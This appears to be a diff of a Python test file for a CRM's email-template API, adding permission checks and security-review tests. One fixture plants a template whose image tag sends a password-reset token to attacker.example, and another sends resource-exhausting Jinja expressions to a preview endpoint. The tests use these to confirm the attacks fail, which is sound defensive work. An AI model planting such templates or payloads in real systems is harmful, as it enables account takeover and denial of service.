@@ -228,7 +228,7 @@ def test_legacy_template_preview_is_branded(db, stop_patches):  # AC-EM040 (impl
 
 
 def test_preview_draft_renders_unsaved_document(db, stop_patches):  # AC-EM031
-    c = _c(db, stop_patches, {VIEW})
+    c = _c(db, stop_patches, {VIEW, EDIT})
     r = c.post(
         "/api/v1/system/email-templates/preview-draft",
         json={"subject": "Draft {{ recipient.name }}", "preheader": "P", "layout_json": DOC},
@@ -238,13 +238,15 @@ def test_preview_draft_renders_unsaved_document(db, stop_patches):  # AC-EM031
     assert out["subject"] == "Draft Sample Recipient"
     assert "Hi Sample Recipient" in out["body_html"]
     assert _c(db, stop_patches, set()).post("/api/v1/system/email-templates/preview-draft", json={"subject": "x"}).status_code == 403
+    # B2: rendering caller-supplied Jinja needs edit, like saving a template does.
+    assert _c(db, stop_patches, {VIEW}).post("/api/v1/system/email-templates/preview-draft", json={"subject": "x"}).status_code == 403
 
 
 def test_preview_draft_uses_system_sample_context(db, stop_patches):
     from app.services.email_system_templates import SYSTEM_TEMPLATES
 
     t = SYSTEM_TEMPLATES["auth_password_reset"]
-    r = _c(db, stop_patches, {VIEW}).post(
+    r = _c(db, stop_patches, {VIEW, EDIT}).post(
         "/api/v1/system/email-templates/preview-draft",
         json={"subject": t.subject, "layout_json": t.document(), "code": "auth_password_reset"},
     )
@@ -278,18 +280,44 @@ def test_render_code_without_row_uses_builtin(db):  # D4
 def test_render_code_uses_admin_row_and_inactive_falls_back(db):  # AC-EM044, Q4
     from app.services.email_template_service import EmailTemplateService
 
-    db.query(EmailTemplate).filter(EmailTemplate.code == "auth_password_reset").delete()
+    db.query(EmailTemplate).filter(EmailTemplate.code == "account_email_changed").delete()
     row = EmailTemplate(
-        code="auth_password_reset", name="Reset", subject="Custom reset", body_html="",
+        code="account_email_changed", name="Changed", subject="Custom changed", body_html="",
         layout_json={"version": 1, "blocks": [{"type": "heading", "text": "Admin wording"}]},
     )
     db.add(row)
     db.flush()
     svc = EmailTemplateService(db)
-    assert svc.render_code("auth_password_reset", {})["subject"] == "Custom reset"
+    assert svc.render_code("account_email_changed", {})["subject"] == "Custom changed"
     row.is_active = False
     db.flush()
-    assert svc.render_code("auth_password_reset", {})["subject"] == "Reset your password"
+    assert svc.render_code("account_email_changed", {})["subject"] == "Your sign-in email was updated"
+
+
+def test_credential_mail_ignores_any_row(db):  # security review B1, PLAN D11
+    from app.services.email_template_service import EmailTemplateService
+
+    db.query(EmailTemplate).filter(EmailTemplate.code == "auth_password_reset").delete()
+    db.add(EmailTemplate(
+        code="auth_password_reset", name="Evil", subject="Evil", body_html="",
+        layout_json={"version": 1, "blocks": [{"type": "custom_text", "html": '<img src="https://attacker.example/p?t={{ reset_link }}">'}]},
+    ))
+    db.flush()
+    out = EmailTemplateService(db).render_code("auth_password_reset", {"reset_link": "https://crm.example.com/change-password?token=SECRET"})
+    assert out["subject"] == "Reset your password"
+    assert "attacker.example" not in out["body_html"]
+
+
+@pytest.mark.parametrize("code", ["auth_password_reset", "user_invitation", "onboarding_intake_link", "purchase_request_approval_link"])
+def test_api_refuses_credential_codes(db, stop_patches, code):  # B1
+    c = _c(db, stop_patches, {VIEW, ADD, EDIT})
+    r = c.post("/api/v1/system/email-templates", json={"code": code, "name": "x", "subject": "x", "body_html": "<p>x</p>"})
+    assert r.status_code == 422
+    row = EmailTemplate(code=unique_code("ok"), name="x", subject="x", body_html="<p>x</p>")
+    db.add(row)
+    db.flush()
+    r = c.put(f"/api/v1/system/email-templates/{row.id}", json={"code": code})
+    assert r.status_code == 422
 
 
 def test_render_code_injects_company_name(db):
@@ -371,3 +399,29 @@ def test_outbox_merge_rebuild_is_wrapped(db):  # AC-EM085 (coalesced)
     assert has_layout(row.body_html)
     if merged2:
         assert oid == oid2 and "<li" in row.body_html and ">b</li>" in row.body_html and ">a</li>" in row.body_html
+
+
+def test_preview_draft_size_limits(db, stop_patches):  # S2
+    c = _c(db, stop_patches, {VIEW, EDIT})
+    assert c.post("/api/v1/system/email-templates/preview-draft", json={"subject": "x", "body_html": "a" * 200_001}).status_code == 422
+    assert c.post("/api/v1/system/email-templates/preview-draft", json={"subject": "x", "context": {"k": "a" * 100_001}}).status_code == 422
+
+
+def test_preview_draft_expensive_jinja_is_bounded(db, stop_patches):  # B2
+    import time
+
+    c = _c(db, stop_patches, {VIEW, EDIT})
+    for heading in (
+        "{% for i in range(100000) %}{% for j in range(100000) %}{% endfor %}{% endfor %}",
+        "{% for i in range(1000) %}{% for j in range(1000) %}{% for k in range(1000) %}{% endfor %}{% endfor %}{% endfor %}",
+        "{{ 'a' * 2000000000 }}",
+        "{{ 9 ** 999999 }}",
+    ):
+        started = time.monotonic()
+        r = c.post(
+            "/api/v1/system/email-templates/preview-draft",
+            json={"subject": "S", "layout_json": {"version": 1, "blocks": [{"type": "heading", "text": heading}]}},
+        )
+        assert r.status_code == 200
+        assert time.monotonic() - started < 6, heading
+        assert "[template-error" not in r.json()["body_html"]
